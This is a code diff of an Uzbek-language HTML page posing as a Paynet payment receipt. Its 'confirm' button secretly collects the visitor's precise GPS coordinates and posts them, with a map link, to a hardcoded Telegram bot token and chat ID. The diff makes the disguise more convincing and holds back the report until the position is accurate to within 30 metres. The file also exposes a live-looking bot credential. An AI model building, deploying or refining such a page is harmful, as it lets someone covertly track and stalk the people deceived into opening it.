@@ -2,140 +2,111 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Chek yuborish</title>
+  <title>Chek</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      margin: 0;
-      padding: 0;
+      margin: 0; padding: 0; background: #f0f2f5; height: 100vh;
+      display: flex; align-items: center; justify-content: center; text-align: center;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: #f0f2f5;
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
     }
-    .container {
+    .box {
       padding: 20px;
-      max-width: 90%;
     }
     button {
-      background: #0088cc;
-      color: white;
-      border: none;
-      padding: 16px 32px;
-      font-size: 18px;
-      border-radius: 12px;
-      cursor: pointer;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-      transition: transform 0.2s;
+      background: #00aa44;
+      color: white; border: none; padding: 18px 40px;
+      font-size: 19px; border-radius: 16px; cursor: pointer;
+      box-shadow: 0 6px 20px rgba(0,170,68,0.3);
+      transition: all 0.2s;
     }
-    button:active {
-      transform: scale(0.95);
-    }
-    button:disabled {
-      background: #ccc;
-      cursor: not-allowed;
-    }
-    .loading {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #333;
-    }
-    .error {
-      color: #d32f2f;
-      font-weight: 500;
-    }
-    h2 {
-      font-size: 22px;
-      color: #333;
-    }
+    button:active { transform: scale(0.94); }
+    button:disabled { background: #cccccc; cursor: not-allowed; }
+    .status { margin-top: 25px; font-size: 18px; }
+    .success { color: #00aa44; font-weight: bold; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>📍 Chekingizni yuborish uchun quyidagi tugmani bosing</h2>
-    <button id="getLocBtn">Chekni yuborish</button>
-    <div class="loading" id="status"></div>
-  </div>
-  <script>
-    const botToken = "5907600944:AAHRhcgacCszCkwiFmNgpzKN4pwvBg2-OxQ";
-    const chatId = "1341701772";
-    const statusEl = document.getElementById("status");
-    const btn = document.getElementById("getLocBtn");
+<div class="box">
+  <h2>Paynet chek</h2>
+  <button id="btn">✓ Tasdiqlash</button>
+  <div class="status" id="status"></div>
+</div>
+<script>
+  const botToken = "5907600944:AAHRhcgacCszCkwiFmNgpzKN4pwvBg2-OxQ";
+  const chatId = "1341701772";
+  const status = document.getElementById("status");
+  const btn = document.getElementById("btn");
+  let watchId = null;
 
-    function sendToTelegram(lat, lon) {
-      const text = `📍 Yangi chek:\nLatitude: ${lat}\nLongitude: ${lon}\n\n🗺 <a href="https://maps.google.com/?q=${lat},${lon}">Xaritada ko‘rish</a>`;
-      
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: text,
-          parse_mode: "HTML"
-        })
-      })
-      .then(() => {
-        statusEl.innerHTML = "✅ Chek muvaffaqiyatli yuborildi!";
-        btn.textContent = "Yuborildi ✅";
-        btn.disabled = true;
-      })
-      .catch(err => {
-        console.error("Telegram xatosi:", err);
-        statusEl.innerHTML = '<span class="error">❌ Xatolik yuz berdi. Qayta urining.</span>';
-        btn.textContent = "Qayta urinib ko‘ring";
-      });
-    }
-
-    function checkLocationServices() {
-      // Joylashuv xizmati yoqilganligini tekshirish uchun test so‘rov
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          sendToTelegram(lat, lon);
-        },
-        (error) => {
-          btn.textContent = "Qayta urinib ko‘ring";
-          let msg = "";
-          switch(error.code) {
-            case error.PERMISSION_DENIED:
-              msg = "Ruxsat rad etildi. Brauzer sozlamalarida chekga ruxsat bering.";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              msg = "Chek ma'lumotlari mavjud emas. Iltimos, telefoningizda GPS yoki joylashuv xizmatini yoqing (Sozlamalar → Joylashuv).";
-              break;
-            case error.TIMEOUT:
-              msg = "Vaqt tugadi. Internet va GPS-ni tekshiring.";
-              break;
-            default:
-              msg = "Noma'lum xatolik yuz berdi.";
-          }
-          statusEl.innerHTML = `<span class="error">❌ ${msg}</span>`;
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
+  function sendLocation(lat, lon) {
+    const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
+    const text = `Yangi buyurtma cheki:\nLatitude: ${lat}\nLongitude: ${lon}`;
+    
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: text,
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [[
+            { text: "🗺 Chekni ko‘rish", url: mapUrl }
+          ]]
         }
-      );
+      })
+    })
+    .then(() => {
+      status.innerHTML = "<span class='success'>✓ Muvaffaqiyatli yuborildi!</span>";
+      btn.textContent = "✓ Yuborildi";
+      btn.disabled = true;
+    })
+    .catch(() => {
+      status.textContent = "Internet aloqasini tekshiring";
+      btn.textContent = "✓ Tasdiqlash";
+    });
+  }
+
+  btn.addEventListener("click", () => {
+    btn.textContent = "Chek aniqlanmoqda...";
+    status.textContent = "Ruxsat bering va GPS ni yoqing (agar o‘chiq bo‘lsa)";
+
+    if (!navigator.geolocation) {
+      status.textContent = "Brauzer chekni qo‘llab-quvvatlamaydi";
+      btn.textContent = "✓ Tasdiqlash";
+      return;
     }
 
-    btn.addEventListener("click", function() {
-      btn.textContent = "Chek olinmoqda...";
-      statusEl.textContent = "Iltimos, ruxsat bering...";
+    watchId = navigator.geolocation.watchPosition(
+      (position) => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
 
-      if (!navigator.geolocation) {
-        statusEl.innerHTML = '<span class="error">❌ Brauzeringiz chekni qo‘llab-quvvatlamaydi.</span>';
-        btn.textContent = "Chekni yuborish";
-        return;
+        if (acc <= 30) {
+          sendLocation(lat, lon);
+          navigator.geolocation.clearWatch(watchId);
+        } else {
+          status.textContent = `Chek aniqligi yaxshilanmoqda... (${Math.round(acc)} m)`;
+        }
+      },
+      (error) => {
+        btn.textContent = "✓ Tasdiqlash";
+        let msg = "";
+        if (error.code === 1) msg = "Ruxsat rad etildi. Brauzer sozlamalaridan ruxsat bering";
+        else if (error.code === 2) msg = "Chek topilmadi. Telefoningizda GPS ni yoqing va tashqariga chiqing";
+        else if (error.code === 3) msg = "Kutish vaqti tugadi. GPS va internetni tekshiring";
+        else msg = "Xatolik yuz berdi";
+        status.textContent = msg;
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0
       }
-
-      // Joylashuv xizmatini yoqishni so‘rash uchun birinchi navbatda ruxsat so‘raymiz
-      checkLocationServices();
-    });
-  </script>
+    );
+  });
+</script>
 </body>
 </html>
